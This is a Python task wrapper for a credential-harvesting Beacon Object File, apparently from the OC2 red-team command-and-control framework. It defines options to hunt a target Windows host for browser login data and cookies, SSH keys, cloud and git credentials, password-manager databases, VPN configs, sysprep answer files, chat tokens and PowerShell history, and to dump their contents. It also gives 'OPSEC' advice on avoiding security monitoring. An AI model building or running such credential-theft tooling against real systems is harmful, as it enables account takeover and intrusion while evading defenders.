"""
OC2 BOF Script for Enum Creds

Unified file enumeration for credential and application data discovery.
Consolidates enum-appdata, enum-browser-creds, enum-credfiles, and
enum-consolehistory into a single BOF with group-based selection.

Groups:
  --appdata  (0x01) - Database clients, chat apps, browser extensions
  --browser  (0x02) - Firefox/Chrome/Edge credential stores
  --creds    (0x04) - SSH keys, cloud creds, git configs, password managers, VPN
  --history  (0x08) - PowerShell console history (PSReadLine)
"""

from typing import List, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


class EnumCredsBOF(BaseBOFTask):
    """
    Enum Creds BOF - Unified file enumeration for credential and application data
    """

    def __init__(self):
        super().__init__(
            "enum-creds",
            base_binary_name="enum-creds"
        )

        self.parser.description = (
            "Search for credential files, browser stores, application data, "
            "and console history on the target system. Replaces enum-appdata, "
            "enum-browser-creds, enum-credfiles, and enum-consolehistory."
        )

        # Search path argument
        self.parser.add_argument(
            "path",
            nargs="?",
            default="C:\\Users",
            help="Directory to search (default: C:\\Users)"
        )

        # Group flags
        self.parser.add_argument(
            "--appdata",
            action="store_true",
            help="Search for app data (DB clients, chat apps, browser extensions)"
        )

        self.parser.add_argument(
            "--browser",
            action="store_true",
            help="Search for browser credential files (Firefox, Chrome, Edge)"
        )

        self.parser.add_argument(
            "--creds",
            action="store_true",
            help="Search for credential files (SSH, cloud, git, passwords, VPN)"
        )

        self.parser.add_argument(
            "--history",
            action="store_true",
            help="Search for PowerShell console history files (PSReadLine)"
        )

        self.parser.add_argument(
            "--all",
            action="store_true",
            help="Search for all file types, including app-data artifacts"
        )

        self.parser.add_argument(
            "--dump",
            action="store_true",
            help="Print the contents of each matched text file (binary files are skipped)"
        )

        self.parser.add_argument(
            "--dump-max-bytes",
            type=int,
            default=65536,
            help="Max bytes printed per file with --dump (default: 65536, max: 1048576)"
        )

        # Sub-type flags for fine-grained control
        self.parser.add_argument(
            "--ssh",
            action="store_true",
            help="(creds) SSH private keys only"
        )

        self.parser.add_argument(
            "--cloud",
            action="store_true",
            help="(creds) Cloud credentials only (AWS, Azure, GCP, K8s)"
        )

        self.parser.add_argument(
            "--git",
            action="store_true",
            help="(creds) Git credentials and configs only"
        )

        self.parser.add_argument(
            "--passwords",
            action="store_true",
            help="(creds) Password manager databases only"
        )

        self.parser.add_argument(
            "--vpn",
            action="store_true",
            help="(creds) VPN configuration files only"
        )

        self.parser.add_argument(
            "--setup",
            action="store_true",
            help="(creds) Unattend/sysprep answer files under the Windows directory only"
        )

        self.parser.add_argument(
            "--db-clients",
            action="store_true",
            help="(appdata) Database client files only"
        )

        self.parser.add_argument(
            "--chat-apps",
            action="store_true",
            help="(appdata) Chat application tokens only"
        )

        self.parser.add_argument(
            "--browser-extensions",
            action="store_true",
            help="(appdata) Browser extension files only"
        )

        self.parser.epilog = (
            "Example usage:\n"
            "  enum-creds                             # Default: browser creds, cred files, console history\n"
            "  enum-creds C:\\Users\\bob                # Search specific user directory\n"
            "  enum-creds --browser                   # Browser credential files only\n"
            "  enum-creds --creds --ssh --cloud       # SSH keys and cloud credentials\n"
            "  enum-creds --appdata --db-clients      # Database client files only\n"
            "  enum-creds --creds --browser           # Credential files + browser creds\n"
            "  enum-creds --history                   # PowerShell console history only\n"
            "  enum-creds --history --dump            # Print every user's PowerShell history inline\n"
            "  enum-creds --git --cloud --dump        # Print git and cloud credential files inline\n"
            "  enum-creds C:\\ --all                   # Search entire C: drive\n\n"
            "Groups:\n"
            "  --appdata: DB clients (SSMS, MySQL, DBeaver, pgAdmin, DataGrip),\n"
            "             chat apps (Slack, Teams, Discord), browser extensions\n"
            "  --browser: Firefox (logins.json, key4.db), Chrome/Edge (Local State,\n"
            "             Cookies, Login Data)\n"
            "  --creds:   SSH keys, cloud credentials (AWS/Azure/GCP/K8s), git configs,\n"
            "             password managers (KeePass, 1Password), VPN configs,\n"
            "             unattend/sysprep answer files (Panther, Sysprep, drive root)\n"
            "  --history: PowerShell ConsoleHost_history.txt (PSReadLine), PowerShell\n"
            "             transcripts in each user's Documents and in the transcription\n"
            "             policy OutputDirectory\n\n"
            "Notes:\n"
            "  - Setup answer files and the transcription policy are fixed system paths,\n"
            "    probed regardless of the search path argument\n"
            "  - --dump prints matched file contents inline, capped per file by --dump-max-bytes\n"
            "  - --dump skips files with NUL bytes (SQLite, key4.db, .kdbx); UTF-16LE text is converted\n"
            "  - Recursive search, max depth 20, max 50000 files enumerated\n"
            "  - Default search excludes --appdata to reduce noise; add --appdata or --all when needed\n"
            "  - Browser creds and PSReadLine history use targeted per-user path checks under C:\\Users\n"
            "  - Skips reparse points and system directories during recursion\n"
            "  - At C:\\Users root, skips default/hidden profile entries only\n"
            "  - Read-only operations - no files are modified\n\n"
            "OPSEC Considerations:\n"
            "  - File system access may trigger security monitoring\n"
            "  - Use targeted groups/flags to reduce noise\n"
            "  - Avoid searching entire drives on monitored systems\n"
        )

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        """
        Encode arguments for the enum-creds BOF.

        BOF expects: Ziii
        - Z: searchPath (wide string)
        - i: groupFlags (int bitmask)
        - i: subFlags (int bitmask)
        - i: dumpMaxBytes (0 = no content dump)
        """
        parser_arguments = self.parser.parse_args(arguments)

        # Group flags: GROUP_APPDATA=0x01, GROUP_BROWSER=0x02, GROUP_CREDS=0x04, GROUP_HISTORY=0x08
        group_flags = 0
        sub_flags = 0

        if parser_arguments.all:
            group_flags = 0xFF
            sub_flags = 0xFF
        else:
            if parser_arguments.appdata:
                group_flags |= 0x01
            if parser_arguments.browser:
                group_flags |= 0x02
            if parser_arguments.creds:
                group_flags |= 0x04
            if parser_arguments.history:
                group_flags |= 0x08

            # Sub-type flags for creds group
            if parser_arguments.ssh:
                sub_flags |= 0x01
                group_flags |= 0x04  # Imply --creds
            if parser_arguments.cloud:
                sub_flags |= 0x02
                group_flags |= 0x04
            if parser_arguments.git:
                sub_flags |= 0x04
                group_flags |= 0x04
            if parser_arguments.passwords:
                sub_flags |= 0x08
                group_flags |= 0x04
            if parser_arguments.vpn:
                sub_flags |= 0x10
                group_flags |= 0x04
            if parser_arguments.setup:
                sub_flags |= 0x20
                group_flags |= 0x04

            # Sub-type flags for appdata group
            if parser_arguments.db_clients:
                sub_flags |= 0x01
                group_flags |= 0x01  # Imply --appdata
            if parser_arguments.chat_apps:
                sub_flags |= 0x02
                group_flags |= 0x01
            if parser_arguments.browser_extensions:
                sub_flags |= 0x04
                group_flags |= 0x01

            # Default to browser creds + credential files + console history
            if group_flags == 0:
                group_flags = 0x0E
            if sub_flags == 0:
                sub_flags = 0xFF

        dump_max_bytes = parser_arguments.dump_max_bytes if parser_arguments.dump else 0

        return [
            (BOFArgumentEncoding.WSTR, parser_arguments.path.strip('"').strip("'")),
            (BOFArgumentEncoding.INT, group_flags),
            (BOFArgumentEncoding.INT, sub_flags),
            (BOFArgumentEncoding.INT, dump_max_bytes),
        ]

    def validate_arguments(self, arguments: List[str]):
        """Validate command arguments"""
        super().validate_arguments(arguments)

        parser_arguments = self.parser.parse_args(arguments)

        if not parser_arguments.path or len(parser_arguments.path.strip()) == 0:
            raise TaskInvalidArgumentsException(
                "Search path cannot be empty"
            )

        if parser_arguments.dump_max_bytes <= 0 or parser_arguments.dump_max_bytes > 1048576:
            raise TaskInvalidArgumentsException(
                "--dump-max-bytes must be between 1 and 1048576"
            )

        if parser_arguments.path in ["C:\\", "C:", "D:\\", "D:"]:
            self.append_response(
                "[!] WARNING: Searching entire drive may take significant time\n"
                "[!] Consider searching specific directories like C:\\Users\n\n"
            )

    def run(self, arguments: List[str]):
        """Execute the enum-creds BOF"""
        parser_arguments = self.parser.parse_args(arguments)

        search_types = []
        has_group = (
            parser_arguments.appdata
            or parser_arguments.browser
            or parser_arguments.creds
            or parser_arguments.history
            or parser_arguments.all
            or parser_arguments.ssh
            or parser_arguments.cloud
            or parser_arguments.git
            or parser_arguments.passwords
            or parser_arguments.vpn
            or parser_arguments.setup
            or parser_arguments.db_clients
            or parser_arguments.chat_apps
            or parser_arguments.browser_extensions
        )

        if not has_group:
            search_types.extend(["Browser creds", "Credential files", "Console history"])
        else:
            if parser_arguments.all:
                search_types.append("All file types")
            else:
                if parser_arguments.appdata:
                    search_types.append("App data")
                if parser_arguments.browser:
                    search_types.append("Browser creds")
                if parser_arguments.creds:
                    search_types.append("Credential files")
                if parser_arguments.history:
                    search_types.append("Console history")
                if parser_arguments.ssh:
                    search_types.append("SSH keys")
                if parser_arguments.cloud:
                    search_types.append("Cloud credentials")
                if parser_arguments.git:
                    search_types.append("Git configs")
                if parser_arguments.passwords:
                    search_types.append("Password managers")
                if parser_arguments.vpn:
                    search_types.append("VPN configs")
                if parser_arguments.setup:
                    search_types.append("Setup answer files")
                if parser_arguments.db_clients:
                    search_types.append("Database clients")
                if parser_arguments.chat_apps:
                    search_types.append("Chat applications")
                if parser_arguments.browser_extensions:
                    search_types.append("Browser extensions")

        dump_line = ""
        if parser_arguments.dump:
            dump_line = f"[*] Dump: first {parser_arguments.dump_max_bytes} bytes of each text match\n"

        self.append_response(
            f"[*] Enum Creds - Searching: {parser_arguments.path}\n"
            f"[*] Filters: {', '.join(search_types)}\n"
            f"{dump_line}"
            f"[*] This may take time depending on directory size...\n\n"
        )

        super().run(arguments)
